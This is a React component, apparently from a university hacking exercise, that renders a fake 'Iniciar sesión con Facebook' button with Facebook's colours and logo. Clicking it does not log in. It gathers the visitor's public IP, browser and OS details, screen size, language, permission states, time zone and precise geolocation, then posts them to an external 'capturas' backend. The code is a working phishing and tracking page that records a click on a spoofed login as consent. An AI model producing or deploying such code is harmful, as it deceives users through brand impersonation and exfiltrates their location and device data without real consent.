
import React, { useEffect, useState } from "react";
import { MapContainer, TileLayer, Marker, Popup } from "react-leaflet";

const PERMISSIONS = ["geolocation", "camera", "microphone", "notifications"];

export const BottonFacebook = () => {

    const [consent, setConsent] = useState(false);
  const [collecting, setCollecting] = useState(false);
  const [data, setData] = useState(null);
  const [status, setStatus] = useState("");

  const getBrowserInfo = () => {
    const nav = navigator;
    const uaData = nav.userAgentData;
    let browser = null;
    let platform = null;

    if (uaData && uaData.brands) {
      browser = uaData.brands.map(b => `${b.brand} ${b.version}`).join(", ");
      platform = uaData.platform || null;
    } else {
      // Fallback
      const ua = nav.userAgent;
      browser = ua;
      platform = nav.platform || null;
    }

    return {
      browser,
      platform,
      languages: nav.languages || [nav.language],
      userAgent: nav.userAgent,
    };
  };

  const getScreenInfo = () => ({
    width: window.screen?.width ?? null,
    height: window.screen?.height ?? null,
    availWidth: window.screen?.availWidth ?? null,
    availHeight: window.screen?.availHeight ?? null,
    pixelRatio: window.devicePixelRatio ?? null,
  });

  const getLocalTimeInfo = () => {
    try {
      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
      return {
        localISO: new Date().toISOString(),
        localString: new Date().toString(),
        timeZone: tz,
      };
    } catch {
      return {
        localISO: new Date().toISOString(),
        localString: new Date().toString(),
        timeZone: null,
      };
    }
  };

  const queryPermissions = async () => {
    if (!navigator.permissions) return {};
    const result = {};
    for (const name of PERMISSIONS) {
      try {
        const status = await navigator.permissions.query({ name });
        result[name] = status.state; // 'granted' | 'denied' | 'prompt'
      } catch {
        result[name] = "unsupported";
      }
    }
    return result;
  };

  const getGeolocation = () =>
    new Promise((resolve) => {
      if (!navigator.geolocation) {
        resolve(null);
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) =>
          resolve({
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
          }),
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    });

  const getPublicIP = async () => {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const json = await res.json();
      return json.ip || null;
    } catch {
      return null;
    }
  };

  const collectAll = async () => {
    setCollecting(true);
    setStatus("Recolectando…");
    try {
      const [permissions, geolocation, ip] = await Promise.all([
        queryPermissions(),
        getGeolocation(),
        getPublicIP(),
      ]);

      const payload = {
        consented: true,
        ipPublica: ip,
        so: getBrowserInfo().platform,
        navegadorYVersion: getBrowserInfo().browser,
        userAgent: getBrowserInfo().userAgent,
        resolucion: getScreenInfo(),
        idiomaSistema: (navigator.languages && navigator.languages[0]) || navigator.language,
        permisos: permissions,
        horaLocal: getLocalTimeInfo(),
        ubicacion: geolocation,
      };

      setData(payload);

      // Puedes comentar o eliminar este bloque si no tienes backend
      const resp = await fetch("https://backend-universidad-hackweb.onrender.com/api/capturas", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (!resp.ok) {
        const t = await resp.text();
        throw new Error(`Error backend: ${resp.status} ${t}`);
      }
      setStatus("Datos recolectados ✅");
    } catch (e) {
      console.error(e);
      setStatus("Error al recolectar datos ❌");
    } finally {
      setCollecting(false);
    }
  };

  useEffect(() => {
    if (consent) collectAll();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [consent]);
  return (
    <div style={{ maxWidth: 600, margin: "2rem auto", fontFamily: "sans-serif" }}>
     
      {!consent && (

         <button
          onClick={() => setConsent(true)}

        style={{
          display: "flex",
          alignItems: "center",
          gap: "0.5rem",
          background: "#1877f3",
          color: "#fff",
          border: "none",
          borderRadius: 8,
          padding: "0.75rem 1.5rem",
          fontSize: 18,
          fontWeight: "bold",
          cursor: "pointer",
          marginTop: 24,
        }}
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          fill="#fff"
          viewBox="0 0 24 24"
        >
          <path d="M22.675 0h-21.35C.595 0 0 .592 0 1.326v21.348C0 23.408.595 24 1.325 24H12.82v-9.294H9.692v-3.622h3.127V8.413c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.797.143v3.24l-1.918.001c-1.504 0-1.797.715-1.797 1.763v2.313h3.587l-.467 3.622h-3.12V24h6.116C23.406 24 24 23.408 24 22.674V1.326C24 .592 23.406 0 22.675 0"/>
        </svg>
        Iniciar sesión con Facebook
      </button>

   
      )}
      
      
    </div> 
  )
}
